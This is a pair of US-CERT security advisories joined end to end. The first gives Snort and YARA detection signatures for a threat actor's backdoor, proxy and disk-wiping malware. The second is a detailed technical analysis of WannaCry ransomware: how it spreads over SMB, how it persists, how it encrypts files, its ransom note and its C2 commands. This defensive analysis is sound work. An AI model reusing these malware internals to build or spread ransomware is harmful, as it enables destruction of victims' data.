88 10|"; fast_pattern:only; content:"|8a 10 80 f2 24 80 ea 67 88 10|"; classtype:bad-unknown;)alert tcp any 488 -> any any (msg:"Lightweight Backdoor 5"; sid:42000022; rev:1; flow:established,from_server; content:"|65 db 37 37 37 37 37 37|"; fast_pattern:only; classtype:bad-unknown;)alert tcp any any -> any 488 (msg:"Lightweight Backdoor 6"; sid:42000023; rev:1; flow:established,to_server; content:"|65 db 37 37 37 37 37 37|"; fast_pattern:only; classtype:bad-unknown;)alert tcp any [547,8080,133,117,189,159] -> any any (msg:"Lightweight Backdoor 7"; sid:42000024; rev:1; flow:established,from_server; content:"|7b 08 2a 2a|"; offset:17; content:"|08 2a 2a 01 00|"; distance:0; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Lightweight Backdoor 8"; sid:42000025; rev:1; flow:established; content:"|8a 10 80 ea 62 80 f2 b4 88 10|"; fast_pattern:only; content:"|8a 10 80 f2 b4 80 c2 62 88 10|"; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Lightweight Backdoor 9"; sid:42000026; rev:1; flow:established; content:"|8a 10 80 c2 4e 80 f2 79 88 10|"; fast_pattern:only; content:"|8a 10 80 f2 79 80 ea 4e 88 10|"; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Lightweight Backdoor 10"; sid:42000027; rev:1; flow:established; content:"Sleepy!@#qaz13402scvsde890"; fast_pattern:only; content:"BC435@PRO62384923412!@3!"; nocase; classtype:bad-unknown;) Proxy Tool:alert tcp any any -> any any (msg:"Proxy Tool 1"; sid:42000028; rev:1; flow:established; content:"|8a 10 80 c2 3a 80 f2 73 88 10|"; fast_pattern:only; content:"|8a 10 80 f2 73 80 ea 3a 88 10|"; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Proxy Tool 2"; sid:42000029; rev:1; flow:established; content:!"HTTP/1"; content:"|e2 1d 49 49|"; depth:4; fast_pattern; content:"|49 49 49 49|"; distance:4; within:4; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Proxy Tool 3"; sid:42000030; rev:1; flow:established; content:"|82 f4 de d4 d3 c2 ca f5 c8 c8 d3 82 fb f4 de d4 d3 c2 ca 94 95 fb d4 d1 c4 cf c8 d4 d3 89 c2 df c2 87 8a cc 87 00|"; fast_pattern:only; classtype:bad-unknown;) Malware associated with the cyber threat actor: alert tcp any any -> any [8000,8080] (msg:"WIPER4";flow: established, to_server;dsize:42;content:"|28 00|";depth:2;content:"|04 00 00 00|";offset:38;depth:4;sid:123;) Host Based IndicatorsBelow are potential YARA signatures to detect malware binaries on host machines: SMB Worm Tool:strings:$STR1 = "Global\\FwtSqmSession106829323_S-1-5-19"$STR2 ="EVERYONE"$STR3 = "y0uar3@s!llyid!07,ou74n60u7f001"$STR4 = "\\KB25468.dat" condition:(uintl6(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) ==0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them Lightweight Backdoor:strings:$STR1 = ''NetMgStart"$STR2 = ''Netmgmt.srg"condition:(uint16(0) == 0x5A4D) and all of them Lightweight Backdoor:strings:$STR1 = "prxTroy" ascii wide nocasecondition:(uintl6(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them Lightweight Backdoor:strings:$strl  = { C6 45 E8 64 C6 45 E9 61 C6 45 EA 79 C6 45 EB 69 C6 45 EC 70 C6 45 ED 6D C6 45 EE 72 C6 45 EF 2E C6 45 F0 74 C6 45 F1  62 C6 45 F2 6C } // 'dayipmr.tbl' being moved to ebpcondition:(uintl6(0) == 0x5A4D or uintl6(0) == 0xCFD0 or uint16(0) == 0xC3D4 oruint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them Lightweight Backdoor:strings:$strl  = { C6 45 F4 61 C6 45 F5 6E C6 45 F6 73 C6 45 F7 69 C6 45 F8 2E C6 45 F9 6E C6 45 FA 6C C6 45 FB 73 } // 'ansi.nls' being moved to ebpcondition:(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 oruint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them Lightweight Backdoor:strings:$strl  = { C6 45 F4 74 C6 45 F5 6C C6 45 F6 76 C6 45 F7 63 C6 45 F8 2E C6 45 F9 6E C6 45 FA 6C C6 45 FB 73 } // 'tlvc.nls' being moved to ebpcondition:(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them Lightweight Backdoor:strings:$STR1 = { 8A 10 80 ?? 4E 80 ?? 79 88 10}$STR2 = {SA 10 80?? 79 80 ?? 4E 88 10}condition:(uintl6(0) == 0x5A4D or uintl6(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them Proxy Tool:strings:$STR1 = "pmsconfig.msi" wide$STR2 = "pmslog.msi" widecondition:(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them Proxy Tool:strings:$STR1 = { 82 F4 DE D4 D3 C2 CA F5 C8 C8 D3 82 FB F4 DE D4 D3 C2 CA 94 95 FB D4 Dl  C4 CF C8 D4 D3 89 C2 DF C2 87 8A CC 87 00 } // '%SystemRoot%\System32\svchost.exe -k' xor A7condition:(uint16(0) == 0x5A4D or uintl6(0) == 0xCFD0 or uint16(0) == 0xC3D4 oruint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them Proxy Tool:strings:$STR2 = {8A 04 17 8B FB 34 A7 46 88 02 83 C9 FF}condition:(uintl6(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $STR2 Destructive Hard Drive Tool:strings:$str0= "MZ"$str1 = {c6 84 24 ?? ( 00 | 01 ) 00 00 }$xorInLoop = { 83 EC 20 B9 08 00 00 00 33 D2 56 8B 74 24 30 57 8D 7C 24 08F3 A5 8B 7C 24 30 85 FF 7E 3A 8B 74 24 2C 8A 44 24 08 53 8A 4C 24 21 8A 5C 24 2B 32 C1 8A 0C 32 32 C3 32 C8 88 0C 32 B9 1E 00 00 00 8A 5C 0C 0C 88 5C 0C 0D 49 83 F9 FF 7F F2 42 88 44 24 0C 3B D7 7C D0 5B 5F 5E 83 C4 20 C3 }condition:$str0 at 0 and $xorInLoop and #str1 > 300 Destructive Target Cleaning Tool:strings:$s1  = {d3000000 [4] 2c000000 [12] 95000000 [4] 6a000000 [8] 07000000}condition:(uintl6(0) == 0x5A4D and uintl6(uint32(0x3c)) == 0x4550) and all of them Destructive Target Cleaning Tool:strings:$secureWipe= { 83 EC 34 53 55 8B 6C 24 40 56 57 83 CE FF 55 C7 44 24 2C D3 00 00 00 C7 44 24 30 2C 00 00 00 89 74 24 34 89 74 24 38 C7 44 24 3C 95 00 00 00 C7 44 24 40 6A 00 00 00 89 74 24 44 C7 44 24 14 07 00 00 00 FF 15 ?? ?? ?? ?? 3B C6 89 44 24 1C 0F 84 (D8 | d9) 01 00 00 33 FF 68 00 00 01 00 57 FF 15 ?? ?? ?? ?? 8B D8 3B DF 89 5C 24 14 0F 84 (BC | BD) 01 00 00 8B 44 24 1C A8 01 74 0A 24 FE 50 55 FF 15 ?? ?? ?? ?? 8B 44 24 4C 2B C7 74 20 48 74 0F 83 E8 02 75 1C C7 44 24 10 03 00 00 00 EB 12 C7 44 24 10 01 00 00 00 89 74 24 28 EB 04 89 7C 24 10 8B 44 24 10 89 7C 24 1C 3B C7 0F 8E ( 5C | 5d ) 01 00 00 8D 44 24 28 89 44 24 4C EB 03 83 CE FF 8B 4C 24 4C 8B 01 3B C6 74 17 8A D0 B9 00 40 00 00 8A F2 8B FB 8B C2 C1 E0 10 66 8B C2 F3 AB EB ( 13 | 14) 33 F6 (E8 | ff 15) ?? ?? ?? ?? 88 04 1E 46 81 FE 00 00 01 00 7C ( EF | ee) 6A 00 6A 00 6A 03 6A 00 6A 03 68 00 00 00 C0 55 FF 15 ?? ?? ?? ?? 8B F0 83 FE FF 0F 84 FA 00 00 00 8D 44 24 20 50 56 FF 15 ?? ?? ?? ?? 8B 2D ?? ?? ?? ?? 6A 02 6A 00 6A FF 56 FF D5 8D 4C 24 18 6A 00 51 6A 01 53 56 FF 15 ?? ?? ?? ?? 56 FF 15 ?? ?? ?? ?? 6A 00 6A 00 6A 00 56 FF D5 8B 44 24 24 8B 54 24 20 33 FF 33 DB 85 CO 7C 5A 7F 0A 85 D2 76 54 EB 04 8B 54 24 20 8B CA BD 00 00 01 00 2B CF 1B C3 85 C0 7F 0A 7C 04 3B CD 73 04 2B D7 8B EA 8B 44 24 14 8D 54 24 18 6A 00 52 55 50 56 FF 15 ?? ?? ?? ?? 8B 6C 24 18 8B 44 24 24 03 FD 83 D3 00 3B D8 7C BE 7F 08 8B 54 24 20 3B FA 72 B8 8B 2D ?? ?? ?? ?? 8B 5C 24 10 8B 7C 24 1C 8D 4B FF 3B F9 75 17 56 FF 15 ?? ?? ?? ?? 6A 00 6A 00 6A 00 56 FF D5 56 FF 15 ?? ?? ?? ?? 56 FF 15 ?? ?? ?? ?? 56 FF 15 ?? ?? ?? ?? 8B 4C 24 4C 8B 6C 24 48 47 83 C1 04 3B FB 8B 5C 24 14 89 7C 24 1C 89 4C 24 4C 0F 8C ( AE | AD) FE FF FF 6A 00 55 E8 ?? ?? ?? ?? 83 C4 08 53 FF 15 ?? ?? ?? ?? 5F 5E 5D 5B 83 C4 34 C3}condition:$secureWipe Destructive Target Cleaning Tool:strings:$S1_CMD_Arg = ""/install'"' fullword$S2_CMD_Parse= ""\""%s'"'  /install \""%s\""'"' fullword$S3_CMD_Builder= ""\'"'%s\""  \""%s\'"' \""%s\'"' %s'"' fullwordcondition:all of them Destructive Target Cleaning Tool:strings:$BATCH_SCRIPT_LN1_0 = ""goto x"" fullword$BATCH_SCRIPT_LN1_1 = '"'del"" fullword$BATCH_SCRIPT_LN2_0 = ""if exist"" fullword$BATCH_SCRIPT_LN3_0 = "":x'"' fullword$BATCH_SCRIPT_LN4_0 = ""zz%d.bat"'' fullwordcondition:(#BATCH_SCRIPT_LNl_l == 2) and all of them" Destructive Target Cleaning Tool:strings:$MCU_DLL_ZLIB_COMPRESSED2={5CECABAE813CC9BCD5A542F454910428343479806F71D5521E2AOD}condition:$MCU_DLL_ZLIB_COMPRESSED2" Destructive Target Cleaning Tool:strings:$MCU_INF_StartHexDec ={010346080A30D63633000B6263750A5052322A00103D1B570A30E67F2A00130952690A50 3A0D2A000E00A26El5104556766572636C7669642E657865}$MCU_INF_StartHexEnc ={6C3272386958BF075230780A0A54676166024968790C7A6779588F5E47312739310163615B3D59686721CF5F2120263ElF5413531FlE004543544C55}condition:$MCU_INF_StartHexEnc or$MCU_INF_StartHexDec Destructive Target Cleaning Tool:strings:$ = "SetFilePointer"$ = "SetEndOfFile"$ = {75 17 56 ff 15 ?? ?? ?? ?? 6a 00 6a 00 6a 00 56 ffD5 56 ff 15?? ?? ???? 56}condition:(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and all of them Destructive Target Cleaning Tool:strings:$license={E903FFFF820050006F007200740069006F006E007300200063006F007000790072006900670068007400200052006F006200650072007400200064006500200042006100740068002C0020004A006F007200690073002000760061006E002000520061006E007400770069006A006B002C002000440065006C00690061006E000000000000000250000000000A002200CE000800EA03FFFF8200}$PuTTY= {50007500540054005900}condition:(uint16(0) == 0x5A4D and uintl6(uint32(0x3c)) == 0x4550) and $license and not $PuTTY Malware used by cyber threat actor:strings:$heapCreateFunction_0 = {33C06A003944240868001000000F94C050FF15????????85C0A3???????07436E893FEFFFF83F803A3???????0750D68F8030000E8??00000059EB0A83F8027518E8????000085C0750FFF35???????0FF15???????033C0C36A0158C3}$heapCreateFunction ={558BECB82C120000E8????FFFF8D8568FFFFFF5350C78568FFFFFF94000000FF1????????085C0741A83BD78FFFFFF02751183BD6CFFFFFF0572086A0158E9020100008D85D4EDFFF68901000005068???????0FF15???????085C00F84D000000033DB8D8DD4EDFFFF389DD4EDFFFF74138A013C617C083C7A7F042C20880141381975ED8D85D4EDFFFF6A165068???????0E8????000083C40C85C075088D85D4EDFFFFEB498D8564FEFFFF68040100005053FF15???????0389D64FEFFFF8D8D64FEFFFF74138A013C617C083C7A7F042C20880141381975ED8D8564FEFFFF508D85D4EDFFFF50E8????????59593BC3743E6A2C50E8????????593BC3597430408BC83818740E80393B75048819EB0141381975F26A0A5350E8????000083C40C83F802741D83F803741883F80174138D45FC50E898FEFFFF807DFC06591BC083C0035BC9C3}$getMajorMinorLinker ={568B7424086A00832600FF15???????06681384D5A75148B483C85C9740D03C18A481A880E8A401B8846015EC3}$openServiceManager ={FF15???0?0?08B?885??74????????????????5?FF15???0?0?08B?????0?0?08BF?85F?74}condition:all of them Malware used by cyber threat actor:strings:$str1 = "_quit"$str2 = "_exe"$str3 = "_put"$str4 = "_got"$str5 = "_get"$str6 ="_del"$str7 = "_dir"$str8 = { C7 44 24 18 1F F7}condition:(uintl6(0) == 0x5A4D or uintl6(0) == 0xCFD0  or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them Malware used by cyber threat actor:strings:$STR1 = { 50 68 80 00 00 00 68 FF FF 00 00 51 C7 44 24 1C 3a 8b 00 00 }condition:(uintl6(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them Recommended Security PracticesBecause of the highly destructive functionality of the malware, an organization infected with the malware could experience operational impacts including loss of intellectual property (IP) and disruption of critical systems. Actual impact to organizations may vary depending on the type and number of systems impacted.Tactical MitigationsStrategic MitigationsThis product is provided subject to this Notification and this Privacy & Use policy.Was this document helpful?  Yes  |  Somewhat  |  NoReceive security alerts, tips, and other updates. US-CERT is part of the Department of Homeland Security.

To give you the best possible experience, this site uses cookies.  Find out more on how we use cookies.Accept
Decline
WannaCry (also known as WCry or WanaCryptor) malware is a self-propagating (worm-like) ransomware that spreads through internal networks and over the public internet by exploiting a vulnerability in Microsoft’s Server Message Block (SMB) protocol, MS17-010. The WannaCry malware consists of two distinct components, one that provides ransomware functionality and a component used for propagation, which contains functionality to enable SMB exploitation capabilities.The malware leverages an exploit, codenamed “EternalBlue”, that was released by the Shadow Brokers on April 14, 2017.The malware appends encrypted data files with the .WCRY extension, drops and executes a decryptor tool, and demands $300 or $600 USD (via Bitcoin) to decrypt the data.The malware uses encrypted Tor channels for command and control (C2) communications.FilenameMD5 HashSize (bytes)Compile TimeDescriptionFiletypemssecsvc.exedb349b97c37d22f5ea1d1841e3c89eb437232642010-11-20T09:03:08ZLoader + Worm ComponentEXEtasksche.exe84c82835a5d21bbcf75a61706d8ab54935143682010-11-20T09:05:05ZLoaderEXEUnavailablef351e1fcca0c4ea05fc44d15a17f8b36655362009-07-14 01:12:55ZEncryptorDLL@WanaDecryptor@.exe7bf2b57f2a205768755c07f238fb32cc2457602009-07-13 23:19:35ZDecryptorEXETable 1: File characteristicsThe malware creates the following two registry run keys to ensure persistence:Value: <Full_path>\tasksche.exeValue: <Full_path>\tasksche.exeThe malware creates the following service to ensure persistence of mssecsvc.exe:The malware creates the following service to ensure persistence of tasksche.exeLoader FilesEncryptor FilesDecryptor FilesThe following artifact can be found on remotely exploited systems:The malware starts by attempting to connect to the following domain with InternetOpenUrl:NOTE: If this succeeds, the malware immediately exits. For a list of observed killswitch domains, see Appendix A.If the connection fails, however, the malware checks the number of arguments passed to the program. If zero, the malware continues with installation; otherwise it enters service mode.Note: Network proxies and other enterprise network security features may prevent the malware from contacting its killswitch domain and inadvertently trigger encryption. Organizations may wish to adjust their proxy configurations or other network configurations to avoid this problem.In service mode, the malware first updates the service config so that failure actions occur if the service exits without entering a SERVICE_STOPPED state. The malware then executes the service function, which registers the service handlers and attempts exploitation of MS17-010 against identified SMB services. This allows remote code execution and enables spreading across the network. This execution is performed in a thread, and the service exits after 24 hours regardless of the status of the thread.The spreader begins by setting up the Windows socket APIs and generating a RSA crypto context. This crypto context is later used to generate random numbers. The malware then builds two DLLs in memory – they are 32 and 64-bit DLLs that have identical functionality. Each one contains a single export named PlayGame that loads the W resource, writes it to C:\WINDOWS\mssecsvc.exe, and executes it. The W resource in each case has been populated with a copy of the running binary (MD5: db349b97c37d22f5ea1d1841e3c89eb4).The malware continues by spawning two threads, the first thread enumerates the network adapters and determines which subnets the system is on. The malware then generates a thread for each IP on the subnet. Each of these threads attempts to connect to the IP on port 445 and, if successful, attempts exploitation of the service via a vulnerability described in MS17-010. An example of an attempt to exploit MS17-010 on a remote system can be seen in Figure 1.Figure 1: WannaCry network traffic attempting SMB exploitOne of the unique features of this traffic is an SMB Tree Connect AndX Request containing the following UNICODE string:  This packet is hand-crafted and hard-coded into the malware.The second thread generates random IPs and attempts to connect to them on port 445. If the connection is successful, the malware then attempts to perform the SMB attack on the system. 128 instances of the second thread area created with two seconds separating each thread creations.The malware continues by creating a service named mssecsvc2.0 with a binary path pointing to the running module with the arguments "-m security". Once created, the malware starts the service. The malware then locates its R resource and loads it into memory. The malware then writes the R resource data to the file C:\WINDOWS\tasksche.exe. The malware executes C:\WINDOWS\tasksche.exe /i with the CreateProcess API. The malware then attempts to move C:\WINDOWS\tasksche.exe to C:\WINDOWS\qeriuwjhrf, replacing the original file if it exists.The malware begins by generating a unique identifier based on the computer name. The identifier, <sys_id>, has the form of 8-15 random lowercase characters followed by 3 numbers. The malware then checks to see if it was passed the /i argument.The /i command copies the running binary to <system_drive>\ProgamData\<sys_id>\tasksche.exe if <system_drive>\ProgamData exists, otherwise it will be copied to <system_drive>\Intel\<sys_id>\tasksche.exe. <system_drive>is the drive letter on which Windows was installed (C:\ for C:\Windows). The malware then updates its current directory to the created directory.The malware then attempts to open the service named <sys_id>. If it does not exist, the malware creates it with a DisplayName of <sys_id> and a BinaryPath of cmd /c <path_to_copied tasksche.exe>. The malware then starts the service. The malware attempts to open the mutex Global\MsWinZonesCacheCounterMutexA0. If the mutex is not created within 60 seconds, the malware re-lauches itself from the new installation directory with no arguments. The malware then waits 60 seconds for the mutex to be created. If the mutex is created in either instance, the initial executable exits. If the mutex fails to be created, the malware continues as if it was run without the /i argument.The malware updates %CD% to the path of the running module and sets HKLM\Software\WanaCrypt0r\wd to %CD%. The malware then loads the XIA resource and decompresses numerous files (see Table 3) to %CD%. The malware then opens %CD%\c.wnry (the configuration data) and loads it into memory. It expects the file to be of size 0x30C. The malware then chooses randomly between the three strings 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94, 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw, and 115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn; writes it to offset 0xB2 in the configuration file; and writes the updated configuration data back to %CD%\c.wnry.The malware then sets the hidden attribute for %CD% by executing the following command with CreateProcess:The malware then executes the following command – granting all users permissions to %CD% and all of its subdirectories:The malware then imports the hard-coded RSA Private key, shown in Figure 2.Figure 2: Imported private keyThe malware then opens and reads %CD%\t.wnry. The first 8 bytes of the file are checked to match the magic value WANACRY!. The file has the following structure:The encrypted key decrypts to the 128-bit AES key BEE19B98D2E5B12211CE211EECB13DE6. This key can then be used to decrypt the enc_data. The decrypted data is saved as a DLL (MD5: f351e1fcca0c4ea05fc44d15a17f8b36). This DLL is then manually loaded into memory and the TaskStart export is called. The TaskStart export of the decrypted DLL is the encryption component of the ransomware.The files shown in Table 2 are extracted from the XIA resource. They are dropped into the %CD% of the running malware.FilenameMD5 HashDescriptionr.wnry3e0020fc529b1c2a061016dd2469ba96Text ransom notes.wnryad4c9de7c8c40813f200ba1c2fa33083Zip file containing Tor filest.wnry5dcaac857e695a65f5c3ef1441a73a8fEncrypted encryption tooltaskdl.exe4fef5e34143e646dbf9907c4374276f5*.WNCRYT file deletion tooltaskse.exe8495400f199ac77853c53b5a3f278f3eUtility used to launch decryption toolu.wnry7bf2b57f2a205768755c07f238fb32ccDecryption toolb.wnryc17170262312f3be7027bc2ca825bf0cRansom image (BMP)c.wnryae08f79a0d800b82fcbe1b43cdbdbefcConfiguration dataTable 2: XIA extracted resourcesTable 3 shows RTF documents containing the ransom note in various languages.FilenameMD5 Hashm_bulgarian.wnry95673b0f968c0f55b32204361940d184m_chinese (simplified).wnry0252d45ca21c8e43c9742285c48e91adm_chinese (traditional).wnry2efc3690d67cd073a9406a25005f7ceam_croatian.wnry17194003fa70ce477326ce2f6deeb270m_czech.wnry537efeecdfa94cc421e58fd82a58ba9em_danish.wnry2c5a3b81d5c4715b7bea01033367fcb5m_dutch.wnry7a8d499407c6a647c03c4471a67eaad7m_english.wnryfe68c2dc0d2419b38f44d83f2fcf232em_filipino.wnry08b9e69b57e4c9b966664f8e1c27ab09m_finnish.wnry35c2f97eea8819b1caebd23fee732d8fm_french.wnry4e57113a6bf6b88fdd32782a4a381274m_german.wnry3d59bbb5553fe03a89f817819540f469m_greek.wnryfb4e8718fea95bb7479727fde80cb424m_indonesian.wnry3788f91c694dfc48e12417ce93356b0fm_italian.wnry30a200f78498990095b36f574b6e8690m_japanese.wnryb77e1221f7ecd0b5d696cb66cda1609em_korean.wnry6735cb43fe44832b061eeb3f5956b099m_latvian.wnryc33afb4ecc04ee1bcc6975bea49abe40m_norwegian.wnryff70cc7c00951084175d12128ce02399m_polish.wnrye79d7f2833a9c2e2553c7fe04a1b63f4m_portuguese.wnryfa948f7d8dfb21ceddd6794f2d56b44fm_romanian.wnry313e0ececd24f4fa1504118a11bc7986m_russian.wnry452615db2336d60af7e2057481e4cab5m_slovak.wnryc911aba4ab1da6c28cf86338ab2ab6ccm_spanish.wnry8d61648d34cba8ae9d1e2a219019add1m_swedish.wnryc7a19984eb9f37198652eaf2fd1ee25cm_turkish.wnry531ba6b1a5460fc9446946f91cc8c94bm_vietnamese.wnry8419be28a0dcec3f55823620922b00faTable 3: Ransom notes in various languagesThe TaskStart export takes two arguments; the handle to the module and an integer that must be zero. TaskStart first creates a mutex named "MsWinZonesCacheCounterMutexA" and reads the contents of c.wnry from the current directory. If the mutex exists or c.wnry is not present, the malware exits. The malware creates another mutex named "Global\MsWinZonesCacheCounterMutexA0".The malware then loads and verifies a key from the file 00000000.dky. The malware then attempts to load a key 00000000.pky. If the key does not exist, the malware imports a public RSA key (seen in Figure 3), generates a new 2048-bit RSA key and saves the public key to 00000000.pky. The malware then saves the generated private key to 00000000.eky, encrypted with the embedded public key.Figure 3: Public RSA keyThe 00000000.eky starts with the number of bytes in little endian (0x500) followed by the encrypted key.The malware launches a thread that writes 136 bytes to 00000000.res every 25 seconds. The buffer written includes the current time of the system. If the file 00000000.res does not exist while the malware is initializing, it creates the file. The initial contents begins with eight randomly generated bytes followed by 128 zero bytes.The malware launches another thread that verifies it can encrypt and decrypt using the keys contained in 00000000.dky and 00000000.pky every 25 seconds. If the decryption is successful, the malware sets a global flag that stops the encryption process.The malware launches another thread that scans for new drives attached to the system every three seconds. If a new drive is attached to the system and is not identified as a type CDROM drive, the malware begins the encryption process on the new drive. On new drives attached to the system, the malware may create the directory <Drive_letter>:\$RECYCLE and execute the following command:The malware creates a thread that executes the process taskdl.exe every 30 seconds.and creates another thread that executes either of the following two binaries (depending on administrator permissions and if the malware is running at system level):A registry key name starting with 8 to 15 characters between 'a' and 'z' followed by three random values between '0' and '9' is then generated by the malware. It may then create the following registry paths with the generated key name:To create the registry key, the malware executes the following command:The malware loads another embedded RSA public key shown in Figure 4.Figure 4: Additional embedded RSA public keyThe malware executes the file @WanaDecryptor@.exe with the argument "fi". This appears to be an initial check-in with the server and the response may contain an updated bitcoin address. The malware updates c.wnry with the current time at offset 0x60.The malware then copies u.wrny to @WanaDecryptor@.exe and executes the script shown in Figure 5 to create @WanaDecryptor@.exe.lnk. The script is saved to a randomly generated filename based on the current time and a random value using characters from '0' to '9'. Example filename: "188391494652743.bat".Figure 5: WannaCry internal script for moving and deleting filesThe malware then writes either "$<Value>worth of bitcoin" or "%.<Value> BTC" depending on the configuration – followed by the contents of the file r.wnry to @Please_Read_Me@.txt, which reads as follows:Q: What's wrong with my files?A: Ooops, your important files are encrypted. It means you will not be able to access them anymore until they are decrypted.
    If you follow our instructions, we guarantee that you can decrypt all your files quickly and safely!
    Let's start decrypting!Q: What do I do?A: First, you need to pay service fees for the decryption.
    Please send <Ransom Amount> to this bitcoin address: <Bitcoin_address>    Next, please find an application file named "@WanaDecryptor@.exe". It is the decrypt software.
    Run and follow the instructions! (You may need to disable your antivirus for a while.)Q: How can I trust?A: Don't worry about decryption.
    We will decrypt your files surely because nobody will trust us if we cheat users.*   If you need our assistance, send a message by clicking <Contact Us> on the decryptor window.Figure 6: Encryption warning displayed to userThe malware then targets files on the user's desktop and documents folders. When the malware starts scanning a directory it creates a temporary file with the prefix "~SD", and deletes it if successful.When selecting which files to encrypt, the malware skips over files with .exe, .dll, and .wncry extensions. The files with the extensions shown in Figure 7 are selected for encryption. Files larger than 209,715,200 bytes may also be encrypted.Figure 7: Files targeted for encryptionThe malware may ignore folders with the following names:The malware will also compare folder names with the following string, and avoid encryption if identified:Note: The string contains a leading whitespace. This particular check is likely included for testing/development purposes.When a directory contains a file that will be encrypted, the malware copies @Please_Read_Me@.txt and @WanaDecryptor@.exe to the directory. It verifies that the first eight bytes do not contain the string WANACRY! and performs additional checks on the header to verify the file is not already encrypted.The files are encrypted with a randomly generated 128-bit AES key in CBC mode with a NULL initialization vector. The key is generated per file, is encrypted with the generated RSA public key, and included in the encrypted file header. Each file encrypted by the malware starts with the string WANACRY! and has the WNCRY extension. Depending on the file properties, the malware may also stage files in a WNCRYT extension.Table 4 shows the file format of encrypted files.OffsetValue0x0000WANACRY!0x0008Length of RSA encrypted data0x000CRSA encrypted AES file encryption key0x010CFile type internal to WannaCry0x0110Original file size0x0118Encrypted file contents  (AES-128 CBC)Table 4: Encrypted file formatWhen encrypting the AES key with RSA, the malware may use the embedded RSA key or a key randomly generated. If the file f.wnry does not exist during initilazation, the malware generates a random number if the file size is less than 209,715,200 bytes. If the number is a multiple of 100, the malware uses the embedded RSA key to encrypt the AES key. A maximum of ten files can be encrypted with this key. When an AES key is encrypted with this RSA key, the malware writes the file path to the file f.wnry. If the random number is not a multiple of 100 or the file f.wnry already exists on the system, the malware will encrypt the AES key with the randomly generated RSA key.Once the malware completes encrypting the desktop and documents folders, it executes the following commands:The malware then encrypts files found on logical drives attached to the system that are not type DRIVE_CDROM.The malware may execute the command:The malware executes the command:The malware will copy b.wnry to @WanaDecryptor@.bmp and place it in each user’s desktop folder, as well as a copy of @WanaDecryptor@.exe.The malware communicates with an Onion server using a Tor server running on local host TCP port 9050. The malware registers the system with the Onion server, transferring encryption keys and deleting volume shadows. Once the ransom is paid, the malware obtains the decrypted RSA private key from the Onion server and decrypts ransomed files.It first attempts to read the contents of the registry path HKLM\Software\WanaCrypt0r\wd. If this fails, the malware attempts to read the contents from a similar registry path within the HKCU registry hive. If one of the registry paths exists, the malware sets the current directory to value read from the registry.The malware attempts to open c.wnry from the current directory and read 780 bytes if it exists. If the file does not exist, the file is created with the contents shown in Figure 8.Figure 8: Contents of c.wnryThe value at offset 0x6c (0x59140342) in c.wnry is the timestamp the file was created. The remaining values are hardcoded within the binary.The decryptor component accepts the command line arguments shown in Table 5.ArgumentDescriptionfiConnects to an Onion server sending details from the system including the host name, user name and eight bytes from 00000000.res. The response may include a Bitcoin address that is updated in c.wnry.coAppears to be an initial check-in with the ransom server without displaying the ransom interface.vsDeletes volume shadow copies using the vssadmin utility.Table 5: Accepted commandsfi ArgumentThe malware reads 136 bytes from the file "00000000.res" in the current path. If the file does not exist the malware exits. The malware reads two URLs from c.wnry at offsets 0x242 and 0x1DE.The first URL at offset 0x1DE in c.wnry is:The alternate URL at offset 0x242 is not configured.The malware then binds a TCP socket to the localhost (127.0.0.1) and connects to port 9050 on the localhost.The malware then checks if the path "TaskData\Tor\taskhsvc.exe" exists. If the file does not exist it is extracted from the archive s.wnry. If s.wnry does not exist, the malware downloads the first URL in the configuration – and if this fails it attempts the second.When downloading from a URL, the downloaded file is first saved to a filename generated with GetTempFileNameA with a "t" prefix within the TaskData folder. The downloaded file is a Zip archive that is extracted to the "TaskData" folder.Once extracted, the malware copies "TaskData\Tor\tor.exe" to "TaskData\Tor\taskhsvc.exe" and executes it.The malware parses the string obtained at offset 0xE4 in the configuration file c.wnry for Onion servers to connect to. The Onion servers listed in the configuration file are as follows:The malware sends the first eight bytes of the file 00000000.res, the host name, user name and the string "+++" to the Onion server. The command and control protocol appears to be custom and XOR encoded with a randomly generated buffer.The response from the server is added to c.wnry if the string is 30 to 50 characters in length. The following is an example message sent to the server:co ArgumentThis argument the malware scans for file names in the format <8_Uppercase_Hex>.res. The file the malware is likely looking for is 00000000.res that is created by the encryption DLL.  The malware then generates a C2 message containing four values (Table 6) obtained from the ".res" file in the following format:Note: In the aforementioned example, the values are separated with a TAB character.ValueDescription---Hard-coded string likely intended to identify the commandTime0Time value obtained from offset 0x60Time1Time value obtained from offset 0x78Unknown int0Integer obtained from offset 0x7CUnknown long64-bit Integer obtained from offset 0x80IndexCount of the current file when scanning for files in the format <8_Uppercase_Hex>.resTable 6: C2 message valuesFigure 9 shows an example of a message.Figure 9: Sample C2 messageAfter sending the message, the malware exits.vs ArgumentThe malware sleeps for 10 seconds and then executes the following command using CreateProcess or RunAs (depending on group membership):No ArgumentThe malware copies b.wnry from the current directory to the desktop with the filename @WanaDecryptor@.bmp. The desktop wallpaper is then 